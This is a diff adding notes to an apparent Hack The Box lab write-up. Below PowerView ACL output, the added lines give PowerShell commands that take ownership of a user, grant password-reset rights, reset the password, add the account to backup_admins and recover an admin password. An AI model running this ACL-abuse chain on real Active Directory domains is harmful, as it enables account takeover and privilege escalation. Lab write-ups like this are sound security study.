@@ -350,3 +350,38 @@ ObjectDN              : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL   ObjectSID      
 ObjectDN              : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL   ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl,WriteOwner                                            BinaryLength          : 24                                       AceQualifier          : AccessAllowed                            IsCallback            : False                                    OpaqueLength          : 0                                        AccessMask            : 983487                                   SecurityIdentifier    : S-1-5-32-544                            AceType               : AccessAllowed                            AceFlags              : None                                     IsInherited           : False                                    InheritanceFlags      : None                                     PropagationFlags      : None                                     AuditFlags            : None                                                                                                    
 ObjectDN              : CN=Tom Hanson,CN=Users,DC=HTB,DC=LOCAL   ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1107                                                  ActiveDirectoryRights : GenericAll                               BinaryLength          : 20                                       AceQualifier          : AccessAllowed                            IsCallback            : False                                    OpaqueLength          : 0                                        AccessMask            : 983551                                   SecurityIdentifier    : S-1-5-18                                 AceType               : AccessAllowed                            AceFlags              : None                                     IsInherited           : False                                    InheritanceFlags      : None                                     PropagationFlags      : None                                     AuditFlags            : None 
 ```
+- Tom has ownership over claire who has ownership over backup admins
+- Set tom as owner of claire ACL
+```PowerShell
+Set-DomainObjectOwner -identity claire -OwnerIdentity tom
+```
+- Give tom permissions to change passwords on that ACL
+```PowerShell
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+```
+- Create a credential then set claire's password
+```PowerShell
+$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
+```
+```PowerShell
+Set-DomainUserPassword -identity claire -accountpassword $cred
+```
+- Use the password to login as claire
+```bash
+ssh claire@10.10.10.77
+```
+- Got claire
+- check backup_admins
+```PowerShell
+net group backup_admins
+```
+- Add claire
+```PowerShell
+net group backup_admins claire /add
+```
+- admin password found in backup file 
+```
+# admin password
+$password="Cr4ckMeIfYouC4n!"
+```
+- Got admin flag
